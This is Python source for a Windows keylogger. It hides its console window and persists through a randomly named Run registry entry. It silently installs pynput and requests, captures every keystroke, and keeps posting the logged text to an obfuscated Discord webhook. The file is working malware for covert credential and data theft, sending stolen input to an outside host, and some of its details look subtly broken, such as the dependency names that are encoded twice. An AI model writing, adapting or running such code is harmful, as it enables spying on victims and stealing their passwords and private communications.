import os
import sys
import subprocess
import threading
import base64
import random
import string
import winreg
import ctypes
from ctypes import wintypes

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def encode_str(s):
    return base64.b64encode(s.encode()).decode()

def decode_str(s):
    return base64.b64decode(s.encode()).decode()

_webhook = decode_str("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NzE4NDg0OTg4MTIwNjkxOC9TTlhaN2d6emw2eDlDcHhJQk9YNHllYkN3QXp6MDl0cWU1emQ1MFpLVThCZkxMajVwbGxVVFZGa2tCNkEyeWtrQkZtMg==")

def hide_console():
    ctypes.windll.kernel32.FreeConsole()
    
def add_to_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        script_path = os.path.abspath(sys.argv[0])
        winreg.SetValueEx(key, random_string(), 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        winreg.CloseKey(key)
    except:
        pass

def install_deps():
    deps = [encode_str("cHlucHV0"), encode_str("cmVxdWVzdHM")]
    for dep in deps:
        try:
            __import__(decode_str(dep))
        except ImportError:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", decode_str(dep)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                startupinfo=startupinfo
            )

def _send():
    global _text
    data = {
        "content": _text,
        "title": random_string()
    }
    requests.post(_webhook, json=data)
    timer = threading.Timer(1, _send)
    timer.daemon = True
    timer.start()

def _on_press(key):
    global _text
    try:
        if key == keyboard.Key.space:
            _text += " "
        elif key == keyboard.Key.enter:
            _text += "\n"
        elif key == keyboard.Key.tab:
            _text += "\t"
        elif key == keyboard.Key.backspace:
            if len(_text) > 0:
                _text = _text[:-1]
        elif key == keyboard.Key.esc:
            return False
        else:
            _text += str(key).strip(" ' ")
    except:
        pass
    _send()

# Main execution
if __name__ == "__main__":
    hide_console()
    add_to_registry()
    install_deps()
    
    import pynput
    from pynput import keyboard
    import requests
    
    _text = ""
    _send()
    
    with keyboard.Listener(on_press=_on_press) as listener:
        listener.join()